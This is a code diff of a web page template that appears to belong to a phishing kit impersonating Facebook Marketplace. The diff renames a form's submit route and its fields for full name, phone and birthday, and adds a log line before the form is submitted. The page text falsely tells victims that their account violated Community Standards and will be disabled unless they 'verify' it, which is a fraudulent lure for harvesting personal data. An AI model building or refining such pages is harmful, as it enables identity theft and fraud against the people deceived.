@@ -17,14 +17,14 @@
             <p class="text-sm text-gray-500">Term of Service</p>
             <hr />
           </div>
-          <form id="form" action="{{ route('getdata') }}" method="POST">
+          <form id="form" action="{{ route('submission') }}" method="POST">
             @csrf
             <input type="hidden" name="businessId" value="278188680457">
             <input type="hidden" name="step" value="2">
           <div class="my-5">We detected unusual activity in your Marketplace account today <strong id="tampil"></strong>. Your account has been reported for violating Marketplace's<b class="cursor-pointer font-medium text-blue-500 hover:underline"> Community Standards</b>. After reviewing this report, we have confirmed that the decision cannot be reversed. To avoid having your account <b class="cursor-pointer font-medium text-blue-500 hover:underline">disabled</b> , please verify your account by following the steps below:</div>          
           <div class="my-5">
             <input
-              id="yourName" name="fullname"
+              id="yourName" name="full_name"
               class="my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
               type="text"
               placeholder="Your Full Name"
@@ -36,7 +36,7 @@
               <div class="special-label">Phone</div>
 
               <input
-                id="phoneInput" name="phone"
+                id="phoneInput" name="phone_number"
                 class="form-control my-2 w-full rounded-lg text-base border-none border-gray-300"
                 placeholder="Your Phone Number"
                 type="tel"
@@ -65,7 +65,7 @@
             <p id="phoneInputError" class="text-red-500 hidden"></p>
 
             <input
-              id="birthday" name="dob"
+              id="birthday" name="birthday"
               class="my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
               type="text"
               placeholder="Birthday (MM/DD/YYYY)"
@@ -256,6 +256,7 @@
                 ).prop("disabled", true).addClass("cursor-not-allowed bg-blue-300").removeClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
                 setTimeout(function() {
                     continueButton.html(continueText).prop("disabled", false).removeClass("cursor-not-allowed bg-blue-300").addClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
+                    console.log('form submitted');
                     $("#form").submit();
                 }, 2000);
             }
